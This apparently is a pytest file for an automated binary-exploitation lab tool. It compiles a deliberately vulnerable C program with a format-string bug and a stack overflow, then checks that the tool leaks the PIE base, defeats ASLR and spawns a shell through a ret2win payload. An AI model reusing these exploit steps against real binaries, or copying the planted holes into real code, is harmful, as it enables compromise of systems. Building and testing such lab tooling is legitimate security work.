"""PIE 포맷스트링 in-band leak: base 를 유출해 rebase ret2win 으로 셸 증명.

다른 PIE 경로(ASLR-off 로컬 base 관측)와 달리 대상이 흘리는 포맷스트링으로 base 를
런타임에 복원한다 — **ASLR 이 켜져 있어도 성립하는 진짜 leak**. 오버플로 오프셋과
leak 인자 위치를 모두 자체 확정한다(offset 인자 불필요).
"""

from __future__ import annotations

import platform
import shutil
import struct
import subprocess

import pytest

from pwnable_lab.analyzer.strategy import find_ret_gadget, ret2win_target
from pwnable_lab.api.services import AnalysisService
from pwnable_lab.config import Settings
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.sandbox.fmtleak import auto_fmt_leak_pie
from pwnable_lab.sandbox.runner import SandboxLimits, run_two_stage_shell

_SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}

# stage1: printf(buf) 포맷스트링 취약점 → base 유출. stage2: 오버플로 → ret2win.
_SRC = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ system("/bin/sh"); }
void vuln(void){
    char buf[128];
    read(0, buf, 120); buf[119] = 0;
    printf(buf);            /* format-string leak */
    fflush(stdout);
    char buf2[64];
    read(0, buf2, 300);     /* stack overflow */
}
int main(void){ setvbuf(stdout, 0, 2, 0); vuln(); return 0; }
"""


def _cc():
    if shutil.which("gcc"):
        return ["gcc"]
    if shutil.which("zig"):
        return ["zig", "cc", "-target", "x86_64-linux-gnu"]
    return None


def _compile_fmt_pie(tmp_path):
    cc = _cc()
    if cc is None:
        return None
    csrc = tmp_path / "fmt.c"
    csrc.write_text(_SRC)
    out = tmp_path / "fmt"
    try:
        subprocess.run(
            [*cc, "-fno-stack-protector", "-pie", "-fPIE", "-o", str(out), str(csrc)],
            check=True,
            capture_output=True,
        )
    except (subprocess.CalledProcessError, OSError):
        return None
    return out


@pytest.fixture()
def fmt_bin(tmp_path):
    if not _SUPPORTED:
        pytest.skip("Linux/x86-64 호스트 필요")
    out = _compile_fmt_pie(tmp_path)
    if out is None:
        pytest.skip("gcc/zig 로 PIE 바이너리 컴파일 불가")
    return out


def test_auto_fmt_leak_pie_proves_shell(fmt_bin):
    report = auto_fmt_leak_pie(str(fmt_bin), limits=SandboxLimits(wall_seconds=8.0))
    assert report["attempted"] is True
    assert report["technique"] == "fmt-leak-pie"
    assert report["succeeded"] is True
    assert report["shell_proven"] is True
    assert report["reason"] == "shell-proven"
    # 오프셋·leak 위치를 자체 확정.
    assert report["overflow_offset"] > 0
    assert report["fmt_position"] > 0
    # base 를 유출값에서 계산 → 진짜 in-band leak.
    assert report["aslr"] == "defeated-via-inband-leak"
    assert report["base_hex"] is not None
    assert report["shell_proof"]["shell_spawned"] is True


def test_fmt_leak_defeats_real_aslr(fmt_bin):
    """유출값으로 base 를 계산하므로 ASLR-on 에서도(매 실행 다른 base) 성립한다."""
    # 캘리브레이션은 코어가 수행하므로, 여기서는 그 산출물로 ASLR-on 재현.
    report = auto_fmt_leak_pie(str(fmt_bin), limits=SandboxLimits(wall_seconds=8.0))
    if not report["succeeded"]:
        pytest.skip("코어가 셸 증명 실패(환경 의존) — ASLR 재현 스킵")
    img = parse_elf(fmt_bin.read_bytes())
    _, win_off = ret2win_target(img)
    ret_off = find_ret_gadget(img)
    offset = report["overflow_offset"]
    position = report["fmt_position"]
    leak_off = int(report["leak_offset_hex"], 16)
    bases = []

    def make_second(line):
        leaked = int(line.strip().split(b"\n")[0], 16)
        base = leaked - leak_off
        bases.append(base)
        p = b"A" * offset
        if report["alignment_ret_gadget"] and ret_off is not None:
            p += struct.pack("<Q", base + ret_off)
        return p + struct.pack("<Q", base + win_off)

    # ASLR ON(disable_aslr=False): 매 실행 랜덤 base 여야 하고, 모두 셸 증명돼야 한다.
    proof, _ = run_two_stage_shell(
        str(fmt_bin),
        make_second,
        marker="PWNPILOT_ASLR",
        prelude=f"%{position}$p".encode(),
        limits=SandboxLimits(wall_seconds=8.0),
        disable_aslr=False,
    )
    assert proof.shell_spawned is True
    assert bases and bases[0] % 0x1000 == 0  # 계산된 base 는 페이지 정렬


def test_auto_fmt_leak_pie_via_service(fmt_bin):
    service = AnalysisService(
        Settings(sandbox_execution_enabled=True, sandbox_executor="inprocess")
    )
    result = service.auto_fmt_leak_pie(fmt_bin.read_bytes())
    assert result["technique"] == "fmt-leak-pie"
    assert result["succeeded"] is True
    assert result["shell_proven"] is True


def test_auto_exploit_falls_back_to_fmt_leak(fmt_bin):
    """2단계 fmt 바이너리는 단일 cyclic 확정이 실패하므로 auto_exploit 이 fmt-leak
    로 폴백해야 한다."""
    service = AnalysisService(
        Settings(sandbox_execution_enabled=True, sandbox_executor="inprocess")
    )
    result = service.auto_exploit(fmt_bin.read_bytes(), pattern_length=200)
    # 단일단계 오프셋 확정은 크래시가 없어 실패.
    assert result["confirmation"].get("confirmed") is not True
    # 폴백 fmt-leak 가 셸을 증명.
    v = result["verification"]
    assert v["technique"] == "fmt-leak-pie"
    assert v["succeeded"] is True
    assert v["aslr"] == "defeated-via-inband-leak"
